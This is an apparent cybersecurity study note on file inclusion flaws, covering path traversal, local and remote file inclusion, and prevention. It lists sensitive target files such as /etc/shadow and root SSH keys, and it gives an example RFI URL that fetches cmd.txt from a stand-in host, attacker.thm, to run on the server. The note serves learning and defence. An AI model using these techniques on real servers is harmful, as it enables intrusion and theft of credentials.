Breakdown of a URL: 
![](Pasted%20image%2020250802084226.png)
(Hesle, _Absolute URL_ ) -> https://servebolt.com/help/technical-resources/the-default-url-structure/

Parameters - query parameter strings attached to the URL to retrieve data or perform actions based on user input

- File Inclusion vulnerabilities typically are found in web applications that are written and implements poorly. 
	- Ex. Poorly written web application written in PHP.

### Path Traversal

Directory Traversal - web security vulnerability that allows an attacker to read operating system resources 

	Ex. Reading local files on a server running an application

#### Important to Know Folder Destinations

| /etc/issue                  | contains a message or system identification to be printed before the login prompt                                                                                |
| --------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /etc/profile                | controls system-wide default variables such as Export variables, File creation mask(unmask), Terminal types, Mail messages to indicate when new mail has arrived |
| /proc/version               | specifies the version of the Linux kernel                                                                                                                        |
| /etc/passwd                 | has all registered users that have access to the system                                                                                                          |
| /etc/shadow                 | contains the information about he system's users' paswswords                                                                                                     |
| /root/.bash_history         | contains the history commands for root user                                                                                                                      |
| /var/log/dmessage           | contains global system messages, including the messages that are logged during system startup                                                                    |
| /root/.ssh/id_rsa           | Private SSH keys for a root or any known valid user on the server                                                                                                |
| /var/mail/root              | all emails for root user                                                                                                                                         |
| /var/log/apache2/access.log | the accessed requests for Apache web server                                                                                                                      |
| C:\boot.ini                 | contains the boot options for computers with BIOS firmware                                                                                                       |


### Local File Inclusion (LFI)

- PHP functions such as *include, requires, include_once, and require_once* often are used on vulnerable web applications.
  

- Null bytes can be used an n injection technique represented as %00 or 0x00 in hex with user supplied data to terminate strings.
	- Tricks the web app into disregarding whatever comes after the Null Byte

### Remote File Inclusion (RFI)

 RFI is a technique used to include remote files into a vulnerable application

- RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. 
- ==One requirement for RFI is that the allow_url_fopen option needs to be on.==

Consequences of RFI:
- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)

- An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Malicious files can then be injected into the include function via HTTPS requests to execute the remote files on the application server

Ex. RFI Steps

1) http://webapp.thm/get.php?file=https://attacker.thm/cmd.txt
2) Web Application gets http://attacker.thm/cmd.txt
3) content of cmd.txt is send to the web application 
4) Application server injects the content of cmd.txt into the *include* function and executes it
5) Results of the execution are sent back within the get.php page



### Preventing File Inclusion vulnerabilities
1. Keep system and services, including web application frameworks, updated with the latest version.
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. Web Application Firewall (WAF) help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.
7. Implement whitelisting for file names and locations as well as blacklisting.